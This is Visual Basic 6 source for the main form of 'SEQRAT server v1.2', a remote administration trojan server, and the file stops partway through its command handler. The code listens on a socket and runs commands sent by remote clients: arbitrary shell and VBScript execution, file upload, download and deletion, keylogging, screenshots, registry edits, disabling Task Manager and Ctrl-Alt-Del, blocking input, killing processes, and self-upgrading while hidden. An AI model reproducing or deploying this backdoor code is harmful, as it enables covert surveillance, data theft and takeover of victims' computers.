VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{0E59F1D2-1FBE-11D0-8FF2-00A0D10038BC}#1.0#0"; "msscript.ocx"
Begin VB.Form frmMain 
   AutoRedraw      =   -1  'True
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Seqrat Server"
   ClientHeight    =   4425
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   6315
   Icon            =   "frmSqServer.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   LockControls    =   -1  'True
   ScaleHeight     =   4425
   ScaleWidth      =   6315
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Caption         =   "Frame1"
      ForeColor       =   &H80000008&
      Height          =   495
      Left            =   360
      TabIndex        =   24
      Top             =   3240
      Width           =   5775
      Begin VB.OptionButton optHTTP 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "WML ( control the server with any WAP enabled device eg.mobile phone )"
         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   1
         Left            =   0
         TabIndex        =   26
         Top             =   240
         Width           =   5655
      End
      Begin VB.OptionButton optHTTP 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "HTML ( control the server with any webbrowser eg. Internet Explorer )"
         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   0
         Left            =   0
         TabIndex        =   25
         Top             =   0
         Value           =   -1  'True
         Width           =   5655
      End
   End
   Begin VB.TextBox txtHTTPport 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   3720
      TabIndex        =   17
      Text            =   "80"
      Top             =   2925
      Width           =   615
   End
   Begin MSWinsockLib.Winsock sckHTTP 
      Index           =   0
      Left            =   5280
      Top             =   4440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSScriptControlCtl.ScriptControl scMain 
      Left            =   2040
      Top             =   4440
      _ExtentX        =   1005
      _ExtentY        =   1005
      AllowUI         =   -1  'True
   End
   Begin VB.Timer tmrState 
      Enabled         =   0   'False
      Interval        =   600
      Left            =   4800
      Top             =   4440
   End
   Begin VB.ListBox lstIPs 
      Appearance      =   0  'Flat
      BackColor       =   &H004B2503&
      ForeColor       =   &H00FFFF00&
      Height          =   1200
      ItemData        =   "frmSqServer.frx":09BA
      Left            =   1200
      List            =   "frmSqServer.frx":09C1
      TabIndex        =   9
      Top             =   1560
      Width           =   2535
   End
   Begin VB.OptionButton Option2 
      Appearance      =   0  'Flat
      BackColor       =   &H00400000&
      Caption         =   "allow connections from all IPs except the ones in the list"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   840
      TabIndex        =   8
      Top             =   1200
      Width           =   4695
   End
   Begin VB.OptionButton Option1 
      Appearance      =   0  'Flat
      BackColor       =   &H00400000&
      Caption         =   "allow connections only from the IPs listed below"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   840
      TabIndex        =   7
      Top             =   960
      Value           =   -1  'True
      Width           =   4695
   End
   Begin VB.TextBox txtPass 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   3200
      PasswordChar    =   "*"
      TabIndex        =   4
      Text            =   "default"
      Top             =   380
      Width           =   1335
   End
   Begin VB.TextBox txtPort 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   1680
      TabIndex        =   2
      Text            =   "8000"
      Top             =   380
      Width           =   615
   End
   Begin MSWinsockLib.Winsock wsMouseK 
      Left            =   3720
      Top             =   4440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock wsScreen 
      Left            =   3240
      Top             =   4440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer scTimer 
      Enabled         =   0   'False
      Left            =   480
      Top             =   4440
   End
   Begin VB.Timer tmrLogin 
      Enabled         =   0   'False
      Index           =   0
      Interval        =   3000
      Left            =   2760
      Top             =   4440
   End
   Begin MSWinsockLib.Winsock wsR 
      Index           =   0
      Left            =   1440
      Top             =   4440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock wsL 
      Index           =   0
      Left            =   960
      Top             =   4440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock ws 
      Index           =   0
      Left            =   0
      Top             =   4440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label lblClients 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   5520
      TabIndex        =   13
      Top             =   4125
      Width           =   495
   End
   Begin VB.Label lblAddress 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "127.0.0.1:80"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   9
         Charset         =   255
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFC0&
      Height          =   225
      Left            =   3240
      TabIndex        =   23
      Top             =   3720
      Visible         =   0   'False
      Width           =   2775
   End
   Begin VB.Label lblBrowse 
      BackStyle       =   0  'Transparent
      Caption         =   "browse to http://"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   9
         Charset         =   255
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFC0&
      Height          =   255
      Left            =   1200
      TabIndex        =   22
      Top             =   3720
      Visible         =   0   'False
      Width           =   2055
   End
   Begin VB.Label Label10 
      Appearance      =   0  'Flat
      BackColor       =   &H00A2470B&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "   HTTP command line server :"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   105
      TabIndex        =   21
      Top             =   2925
      Width           =   2415
   End
   Begin VB.Shape shpHTTP 
      BackColor       =   &H000000FF&
      BackStyle       =   1  'Opaque
      BorderColor     =   &H00000000&
      Height          =   255
      Left            =   2520
      Shape           =   3  'Circle
      Top             =   2925
      Width           =   285
   End
   Begin VB.Label Label9 
      Appearance      =   0  'Flat
      BackColor       =   &H00A2470B&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "port :"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   3240
      TabIndex        =   20
      Top             =   2925
      Width           =   495
   End
   Begin VB.Label btnHTTPon 
      BackColor       =   &H006A2B00&
      Caption         =   "    start"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   4680
      TabIndex        =   19
      Top             =   2925
      Width           =   735
   End
   Begin VB.Label btnHTTPoff 
      BackColor       =   &H006A2B00&
      Caption         =   "    stop"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   5520
      TabIndex        =   18
      Top             =   2925
      Width           =   735
   End
   Begin VB.Line Line4 
      X1              =   3000
      X2              =   3000
      Y1              =   2880
      Y2              =   3260
   End
   Begin VB.Line Line3 
      X1              =   4560
      X2              =   4560
      Y1              =   2880
      Y2              =   3260
   End
   Begin VB.Shape Shape4 
      BorderColor     =   &H00808080&
      Height          =   1155
      Left            =   30
      Top             =   2880
      Width           =   6255
   End
   Begin VB.Label Label24 
      BackStyle       =   0  'Transparent
      Caption         =   "SEQRAT server v1.2"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   9
         Charset         =   255
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFC0&
      Height          =   255
      Left            =   120
      TabIndex        =   16
      Top             =   60
      Width           =   2295
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "hide"
      ForeColor       =   &H00FFC0C0&
      Height          =   255
      Left            =   5280
      TabIndex        =   15
      Top             =   60
      Width           =   375
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   " x"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   6000
      TabIndex        =   14
      Top             =   40
      Width           =   255
   End
   Begin VB.Line Line2 
      X1              =   4600
      X2              =   4600
      Y1              =   340
      Y2              =   720
   End
   Begin VB.Line Line1 
      X1              =   1200
      X2              =   1200
      Y1              =   340
      Y2              =   720
   End
   Begin VB.Label lblStart 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "  clients online : "
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   4080
      TabIndex        =   12
      Top             =   4110
      Width           =   2055
   End
   Begin VB.Shape Shape3 
      BorderColor     =   &H00808080&
      Height          =   2115
      Left            =   30
      Top             =   720
      Width           =   6255
   End
   Begin VB.Label btnRemoveIp 
      BackColor       =   &H006A2B00&
      Caption         =   "remove selected IP"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   3840
      TabIndex        =   11
      Top             =   2160
      Width           =   1455
   End
   Begin VB.Label btnAddIp 
      BackColor       =   &H006A2B00&
      Caption         =   "     add IP to list"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   3840
      TabIndex        =   10
      Top             =   1800
      Width           =   1455
   End
   Begin VB.Label btnStop 
      BackColor       =   &H006A2B00&
      Caption         =   "    stop"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   5520
      TabIndex        =   6
      Top             =   380
      Width           =   735
   End
   Begin VB.Label btnStart 
      BackColor       =   &H006A2B00&
      Caption         =   "    start"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   4680
      TabIndex        =   5
      Top             =   380
      Width           =   735
   End
   Begin VB.Label Label4 
      Appearance      =   0  'Flat
      BackColor       =   &H00A2470B&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "password :"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   2400
      TabIndex        =   3
      Top             =   380
      Width           =   795
   End
   Begin VB.Label Label5 
      Appearance      =   0  'Flat
      BackColor       =   &H00A2470B&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "port :"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   1320
      TabIndex        =   1
      Top             =   380
      Width           =   390
   End
   Begin VB.Shape shpLight 
      BackColor       =   &H000000FF&
      BackStyle       =   1  'Opaque
      BorderColor     =   &H00000000&
      Height          =   255
      Left            =   840
      Shape           =   3  'Circle
      Top             =   380
      Width           =   285
   End
   Begin VB.Label Label7 
      Appearance      =   0  'Flat
      BackColor       =   &H00A2470B&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "listening :"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   100
      TabIndex        =   0
      Top             =   380
      Width           =   735
   End
   Begin VB.Shape Shape8 
      BackColor       =   &H00FFFFFF&
      FillColor       =   &H00FF8080&
      FillStyle       =   0  'Solid
      Height          =   360
      Left            =   -120
      Top             =   340
      Width           =   6945
   End
   Begin VB.Shape Shape2 
      BackColor       =   &H0091450D&
      BackStyle       =   1  'Opaque
      BorderColor     =   &H00000000&
      Height          =   300
      Left            =   -120
      Top             =   4080
      Width           =   6480
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H0091450D&
      BackStyle       =   1  'Opaque
      BorderColor     =   &H00000000&
      Height          =   300
      Left            =   -120
      Top             =   35
      Width           =   6480
   End
   Begin VB.Shape Shape6 
      BackColor       =   &H00FFFFFF&
      FillColor       =   &H00FF8080&
      FillStyle       =   0  'Solid
      Height          =   360
      Left            =   0
      Top             =   2880
      Width           =   6945
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'                Joaquín Encina----Chile

'This program is free software; you can redistribute it and/or
'modify it under the terms of the GNU General Public License
'as published by the Free Software Foundation; either version 2
'of the License, or (at your option) any later version.
'This program is distributed in the hope that it will be useful,
'but WITHOUT ANY WARRANTY; without even the implied warranty of
'MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
'See the GNU General Public License for more details.
'You should have received a copy of the GNU General Public License
'along with this program; if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

Dim HTTPs As Byte
Private MDForm
Private MDFormX
Private MDFormY

Private Sub btnAddIp_Click()
rasp = InputBox("enter the IP", "IP rules")
If rasp <> "" Then lstIPs.AddItem rasp
End Sub


Private Sub btnRemoveIp_Click()
If lstIPs.ListIndex <> -1 Then lstIPs.RemoveItem (lstIPs.ListIndex)
End Sub

Private Sub btnStart_Click()
btnStop_Click
ws(0).LocalPort = Val(txtPort.Text)
ws(0).Listen
End Sub

Private Sub btnStop_Click()
If ws(0).State <> sckClosed Then ws(0).Close
For i = 1 To 5
    If ws(i).State <> sckClosed Then ws(i).Close
Next i
End Sub

Private Sub form_MouseDown(Button As Integer, shift As Integer, x As Single, y As Single)
MDForm = 1
MDFormX = x
MDFormY = y
End Sub
Private Sub form_MouseUp(Button As Integer, shift As Integer, x As Single, y As Single)
MDForm = 0
End Sub
Private Sub form_MouseMove(Button As Integer, shift As Integer, x As Single, y As Single)
If MDForm <> 1 Then Exit Sub
Me.Top = (GetY * 15) - MDFormY
Me.Left = (GetX * 15) - MDFormX
End Sub

Public Sub form_load()
On Error Resume Next

'upgrader stuff - will work only if compiled exe
'if from ide then don't use the upgrade
'also when using restart server the exe server will start but not the listening
'the listening should be manually started
start = Timer
Do While Timer < start + 0.5
    DoEvents
Loop

If Mid(App.EXEName, 1, 4) = "tmpx" Then
    x = KillProcess(Mid(App.EXEName, 5, Len(App.EXEName)) & ".exe")
    start = Timer
    Do While Timer < start + 0.5
        DoEvents
    Loop
    If x = True Then
        Call KillFile(fulln(App.Path) & Mid(App.EXEName, 5, Len(App.EXEName)) & ".exe")
        FileCopy fulln(App.Path) & App.EXEName & ".exe", fulln(App.Path) & Mid(App.EXEName, 5, Len(App.EXEName)) & ".exe"
        x = Shell(fulln(App.Path) & Mid(App.EXEName, 5, Len(App.EXEName)) & ".exe", vbHide)
        If x <> 0 Then End
    End If
    serverONTime = Format(Now) & "  |! UPGRADER APP !|"
Else
    If Dir(fulln(App.Path) & "tmpx" & App.EXEName & ".exe", 39) <> "" Then
        Call KillFile(fulln(App.Path) & "tmpx" & App.EXEName & ".exe")
    End If
    serverONTime = Format(Now)
End If

'previous instance detect
Dim tmpStr() As String
tmpStr = Split(ProcessList, vbCrLf, -1)
Do While tmpStr(i) <> ""
    If InStr(1, tmpStr(i), App.EXEName & ".exe") > 0 Then zaza = zaza + 1
    i = i + 1
Loop
If zaza > 1 Then End

'start the sockets
For i = 1 To 5
    Load ws(i)
    Load tmrLogin(i)
    tmrLogin(i).Enabled = False
Next i

'start the scripting engine
scMain.Language = "VBScript"
scMain.Timeout = 10000
scMain.AllowUI = True
scMain.UseSafeSubset = False
scMain.AddObject "SCRIPT", scMain, True
scMain.AddObject "MAIN", Me, True
scMain.AddObject "CHAT", frmChat, True
Set ZLib = New clsZLib
scMain.AddObject "ZLIB", ZLib, True
EndKeyLogger = True
tmrState.Enabled = True
End Sub
Public Sub form_unload(i As Integer)
On Error Resume Next
    Unload frmChat
    For i = 1 To 5
        Unload ws(i)
    Next i
    ws(0).Close
    SendMCIString "close all", True
    Set ZLib = Nothing
    Set scMain = Nothing
    End
End Sub

Public Function randomKey() As String
    Randomize
    For i = 1 To 8
        randomKey = randomKey & Chr(Int((254 + 1) * Rnd))
    Next i
End Function

Private Sub Label1_Click()
    Me.Hide
End Sub

Private Sub Label3_Click()
Unload Me
End Sub

Private Sub Label4_Click()
If txtPass.PasswordChar = "" Then
    txtPass.PasswordChar = "*"
Else
    txtPass.PasswordChar = ""
End If
End Sub

Private Sub tmrLogin_Timer(index As Integer)
If index <> 0 Then
    If loginOk(index) = 0 Then
        ws(index).Close
        tmrLogin(index).Enabled = False
    End If
End If
End Sub

Private Sub tmrState_Timer()
Dim onLiners As String
If ws(0).State = sckListening Then
    shpLight.BackColor = vbGreen
Else
    shpLight.BackColor = vbRed
End If
onLiners = Str(nroC)
If Val(onLiners) = 0 Then
    lblStart.ForeColor = vbWhite
Else
    lblStart.ForeColor = vbGreen
End If
lblClients.Caption = onLiners
End Sub

Public Sub ws_ConnectionRequest(index As Integer, ByVal requestID As Long)
On Error Resume Next
Dim data As String
If index = 0 Then
    'first check if the IP is permited to connect
    If checkIPlist(ws(0).RemoteHostIP) = 1 Then Exit Sub
    
    start = Timer
    Do While Timer < start + 0.1
        DoEvents
    Loop
    
    For nR = 1 To 5
        If ws(nR).State = sckClosed Then
            ws(nR).Accept requestID
            loginOk(nR) = 0
            sessKey(nR) = randomKey
            tmpStr$ = "k1" & sessKey(nR)
            Do While Len(tmpStr) < 10
                DoEvents
            Loop
            sc(nR) = 0
            start = Timer
            ws(nR).SendData tmpStr
            Do While sc(nR) = 0 And Timer < start + 6
                DoEvents
            Loop
            tmrLogin(nR).Interval = 2000
            tmrLogin(nR).Enabled = True
            Exit For
        End If
    Next nR
End If
End Sub


Public Sub ws_close(index As Integer)
On Error Resume Next
ws(index).Close
Unload ws(index)
loginOk(index) = 0
If index = 0 Then
    Load ws(0)
    Do While ws(0).State <> sckListening
        ws(0).Close
        ws(0).Listen
        DoEvents
    Loop
End If
Load ws(index)
End Sub

Public Sub auth(ByVal key As String, socknr As Integer)
'authentication is made here
Dim crtPass As String * 8
If Len(txtPass.Text) < 8 Then
    crtPass = txtPass.Text & String(8 - Len(txtPass.Text), 245)
Else
    crtPass = Mid(txtPass.Text, 1, 8)
End If
    For i = 1 To 8
        testkey = testkey & Chr(Asc(Mid(key, i, 1)) Xor Asc(Mid(sessKey(socknr), i, 1)) Xor Asc(Mid(crtPass, i, 1)))
    Next i
    If testkey = Mid(key, 9, 8) Then
        loginOk(socknr) = 1
        tmrLogin(socknr).Enabled = False
        sessKey(socknr) = mkSessKey(key)
        wsSend socknr, "re" & "Greetings from " & ws(socknr).LocalHostName & " - " & ws(socknr).LocalIP, True
    End If
End Sub

Public Function mkSessKey(ByVal tmpkey As String) As String
For i = 1 To 20
    mkSessKey = mkSessKey & Chr(Asc(Mid(tmpkey, (i Mod 16) + 1, 1)) Xor (i + 20))
Next i
End Function

Public Sub ws_DataArrival(index As Integer, ByVal bytes As Long)
On Error Resume Next
Dim data As String
Dim tmpParm() As String

    If cont(index) = 1 Then Exit Sub
    ws(index).GetData data
    
    If data = Chr(0) Then
        scReply = 1
        Exit Sub
    End If
    
    args = Mid(data, 3, Len(data))

    If (loginOk(index) = 0) And (bytes > 18 Or Mid(data, 1, 2) <> "k2") Then
        If index <> 0 Then ws(index).Close
        Exit Sub
    End If
    
    If Mid(data, 1, 2) <> "07" And Mid(data, 1, 2) <> "k2" _
    And Mid(data, 1, 2) <> "20" And Mid(data, 1, 2) <> "29" _
    And Mid(data, 1, 2) <> "sb" Then
        args = encdec(sessKey(index), args)
    End If
    
    scMain.run "DataArival", Mid(data, 1, 2) & args
    
    Select Case Mid(data, 1, 2)
        
        Case "k2":  DoEvents
                    Call auth(args, index)
        
        'Case "01": GetPwl (index)
        Case "02": ts = IIf(sendKey(args) = 1, "keys sent to current application.", "keysend error.")
                    wsSend index, "02" & ts, True
        Case "03":
                   ts = run(args)
                   wsSend index, "03" & IIf(ts = 0, "running " & Mid(args, 1, Len(args) - 1) & " failed.", Mid(args, 1, Len(args) - 1) & " started. program's task ID:" & ts), True
                   
        Case "04": ts = browse(args)
                    wsSend index, "04" & ts, True
        Case "05": KillFile (args)
                    wsSend index, "05"
        Case "06": sendfiles index, args
                    
        Case "07": putfile index, args
        Case "08":  wsSend index, "08" & "exiting windows...", True
                    Call ExitWindowsEx(Val(args), 0)
        Case "09": bep (args)
        Case "xx": wsSend index, "xx"
                   Unload Me
        'Case "11":
                    'If killServer = "ok" Then
                        'wsSend index, "11" & "server removed.", True
                    'Else
                        'wsSend index, "11" & "removal failed.", True
                    'End If
        Case "12":
                    wsSend index, "12" & listWind, True

        Case "15": ts = Infos(index)
                   wsSend index, "15" & ts, True

        Case "16": msg (args)
                    wsSend index, "16" & "messagebox shown and responded.", True
        Case "17":  wsSend index, "17" & "presenting BlueScreenOfDeath...", True
                    Shell "/con/con", vbHide
        Case "18": MkDir (args)
        Case "19": RmDir (args)
        Case "20":  ts = upgrade(index, args)
                    wsSend index, "20" & ts, True
        Case "AC": ack = "ACK"
        Case "21": CDOpen
                    wsSend index, "21"
        Case "22": CDClose
                    wsSend index, "22"
        Case "23": x = SystemParametersInfo(97, True, CStr(1), 0)
                   wsSend index, "23" & IIf(x = True, "ctrl-alt-del disabled.", "ctr-alt-del cannot be disabled."), True
        Case "24": x = SystemParametersInfo(97, False, CStr(1), 0)
                   wsSend index, "23" & IIf(x = True, "ctrl-alt-del enabled.", "ctrl-alt-del cannot be enabled."), True
        Case "25":
                    If frmChat.Text1.Visible = True And frmChat.Visible = True Then
                        wsSend index, "25" & frmChat.Text1.Text & vbCrLf, True
                    Else
                        frmChat.Text1.Text = args + vbCrLf
                        frmChat.Text1.SelStart = Len(frmChat.Text1.Text)
                        frmChat.Show vbModal, Me
                    End If
        Case "26":
                    frmChat.Text1.Visible = True
                    frmChat.Image1.Visible = False
                    For soknr = 1 To 5
                    If ws(soknr).State = 7 Then
                        wsSend soknr, "26" & "<" & Format(index) & "> " & args, True
                    End If
                    Next soknr
                    If args = "cmdCloseX" Then
                        Unload frmChat
                    Else
                        frmChat.Text1.Text = frmChat.Text1.Text + "<" + Format(index) + "> " + args + vbCrLf
                        frmChat.Text1.SelStart = Len(frmChat.Text1.Text)
                    End If
        Case "27":
                    frmChat.Text1.Visible = False
                    frmChat.Image1.Visible = True
                    If Mid(args, 1, 1) = 0 Then
                        frmChat.Image1.Stretch = False
                    Else
                        frmChat.Image1.Stretch = True
                    End If
                    frmChat.Image1.Picture = LoadPicture(Mid(args, 2, Len(args)))
                    wsSend index, "27"
                    frmChat.Show vbModal, Me
        Case "28":  printText (args)
                    wsSend index, "28"
        Case "29":  wsSend index, "29"
                    Call snapshot
                    Call sendfiles(index, App.Path + "\systems.tmp")
        Case "30":
                    If Len(args) > 1 Then
                    If Mid(args, 1, 1) = 1 Then
                        x = PlaySound(Mid(args, 2, Len(args)), 0, 2 Or 1)
                    Else
                        x = PlaySound(Mid(args, 2, Len(args)), 0, 2 Or 8 Or 1)
                    End If
                    wsSend index, "30"
                    End If
        Case "31":  x = PlaySound(0, 0, &H40)
                    If x = True Then wsSend index, "31"
        Case "32":  ShowWindow CLng(args), 1
                    t = SetForegroundWindow(CLng(args))
                    z = BringWindowToTop(CLng(args))
                    wsSend index, "32"
        Case "33": For i = 1 To 9
                        FlashWindow CLng(args), 1
                        start = Timer
                        Do While Timer < start + 0.2
                            DoEvents
                        Loop
                    Next i
                    wsSend index, "33"
                    
        Case "35": ShowWindow CLng(Mid(args, 3, Len(args))), CLng(Mid(args, 1, 2))
                   wsSend index, "35"
        Case "36":
                    If SwapMouseButton(True) <> 0 Then SwapMouseButton (False)
                   wsSend index, "36mouse buttons swaped.", True
       Case "37": x = SystemParametersInfo(20, True, CStr(Mid(args, 3, Len(args)) + Chr(0)), 0)
                    wsSend index, "37" & IIf(x = 1, "set", ""), True
       Case "38": x = SystemParametersInfo(93, Val(args), CStr(1), 0)
                    wsSend index, "38" & IIf(x = 1, "set", ""), True
       Case "39": x = SystemParametersInfo(57, True, vbNull, 2)
                    wsSend index, "39" & IIf(x = 0, "failed.", "ok."), True
       Case "40": x = SystemParametersInfo(57, False, CStr(1), 2)
                    wsSend index, "40" & IIf(x = 0, "failed.", "ok."), True
       Case "41": x = SystemParametersInfo(47, 0, vbNull, 2)
                    wsSend index, "41" & IIf(x = 0, "failed.", "ok."), True
       
       Case "43": x = SetComputerName(args)
                    wsSend index, "43" & IIf(x = 1, "set", ""), True
       Case "51": Call redirect(index, args)
       Case "52": Call disableRedir
                    wsSend index, "52"
       Case "53": HideTaskBar
                    wsSend index, "53"
       Case "54": ShowTaskBar
                    wsSend index, "54"
        Case "55": HideDesktop
                    wsSend index, "55"
        Case "56": ShowDesktop
                    wsSend index, "56"
        Case "57": HideStartButton
                    wsSend index, "57"
        Case "58": ShowStartButton
                    wsSend index, "58"
        Case "59": HideTaskBarIcons
                    wsSend index, "59"
        Case "60": ShowTaskBarIcons
                    wsSend index, "60"
        Case "61": HideProgramsShowingInTaskBar
                    wsSend index, "61"
        Case "62": ShowProgramsShowingInTaskBar
                    wsSend index, "62"
        Case "63": HideTaskBarClock
                    wsSend index, "63"
        Case "64": ShowTaskBarClock
                    wsSend index, "64"
                    
        Case "65":  wsSend index, "6C" & "executing command: " & args, True
                    wsSend index, "65" & ExecuteCommand(args), True
        Case "66":  SendMessage frmMain.hwnd, &H112, &HF170, 2
        Case "67":  SendMessage frmMain.hwnd, &H112, &HF170, -1
        Case "68":  Select Case Mid(args, 1, 2)
                        Case "00": wsSend index, "6800" & sendBackNTStuff, True
                        Case "01": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system\DisableTaskMgr", Mid(args, 4, 1)
                        Case "02": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\Explorer\NoLogoff", Mid(args, 4, 1)
                        Case "03": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\Explorer\NoClose", Mid(args, 4, 1)
                        Case "04": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system\DisableLockWorkstation", Mid(args, 4, 1)
                        Case "05": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system\DisableChangePassword", Mid(args, 4, 1)
                    End Select
                    wsSend index, "68" & " ok...", True
        Case "69": Call killAllRedirect
                    wsSend index, "69"
        Case "70": wsSend index, "70"
                    btnStart_Click
        Case "71":  wsSend index, "71"
                    EndKeyLogger = False
                    Call CheckKey(index)
        Case "72":  EndKeyLogger = True
                    wsSend index, "72"
        
        Case "75":  wsSend index, "75" & Format(Now, "HH:mm:ss") & "> executing statements...", True
                    errIndex = index
                    scrcode = Replace(args, "gimme(", "scSend(" & Str(index) & ",")
                    scrcode = Replace(scrcode, "gimme ", "scSend " & Str(index) & ",")
                    scrcode = Replace(scrcode, "%myindex", Str(index))
                    scMain.ExecuteStatement scrcode
                    start = Timer
                    Do While Timer < start + 0.2
                        DoEvents
                    Loop
                    wsSend index, "75" & Format(Now, "HH:mm:ss") & "> script execution ended.", True
                    
        Case "76":  wsSend index, "76"
                    errIndex = index
                    scrcode = Replace(args, "gimme(", "call scSend(" & Str(index) & ",")
                    scrcode = Replace(scrcode, "gimme ", "scSend " & Str(index) & ",")
                    scrcode = Replace(scrcode, "%myindex", Str(index))
                    scMain.AddCode scrcode
                    'wsSend Index, "76" & "code added to script control.", True
        'Case "97": scMain.Reset
        
        Case "77":  ts = EnumerateSections(args)
                    tmpParm = Split(ts, vbCrLf)
                    For i = 0 To UBound(tmpParm) - 1
                        wsSend index, "77" & tmpParm(i), True
                    Next i
        Case "78": ts = EnumerateValues(args)
                    tmpParm = Split(ts, vbCrLf)
                    For i = 0 To UBound(tmpParm) - 1
                        wsSend index, "78" & tmpParm(i), True
                    Next i
        
        Case "79":  ts = SaveString(Mid(args, 1, InStr(1, args, Chr(0)) - 1), Mid(args, InStr(1, args, Chr(0)) + 1, Len(args)))
                    wsSend index, "79" & ts, True
        Case "80": ts = SaveStringWORD(Mid(args, 1, InStr(1, args, Chr(0)) - 1), Mid(args, InStr(1, args, Chr(0)) + 1, Len(args)))
                    wsSend index, "80" & ts, True
        Case "81":  ts = DeleteString(args)
                    wsSend index, "81" & ts, True
        Case "82":  ts = deleteKey(args)
                    wsSend index, "82" & ts, True
        Case "83": ts = ProcessList
                    wsSend index, "83" & ts, True
        Case "84":
                    If KillProcessID(args) = True Then
                        wsSend index, "84" & "process terminated.", True
                    Else
                        wsSend index, "84" & "killing process failed.", True
                    End If
        Case "85":
                    ts = IIf(ShowCursor(False) >= 0, "mouse cursor shown.", "mouse cursor hidden.")
                    wsSend index, "85" & ts, True
        Case "86":
                    ts = IIf(ShowCursor(True) >= 0, "mouse cursor shown.", "mouse cursor hidden.")
                    wsSend index, "86" & ts, True

        Case "87": wsSend index, "87" & IIf(BlockInput(True), "mouse and keyboard blocked.", "already blocked."), True
        Case "88": wsSend index, "88" & IIf(BlockInput(False), "mouse and keyboard unblocked.", "unblocked."), True
        
        Case "89":  wsSend index, "89" & "restarting server...", True
                    x = Shell(fulln(App.Path) & App.EXEName & ".exe", vbHide)
                    If x <> 0 Then Unload Me 'KillProcessID (App.threadID)
                    wsSend index, "89" & "restarting server failed.", True
        
        
                
        Case "91":  wsSend index, "91" & Str(GetX) & ";" & Str(GetY), True
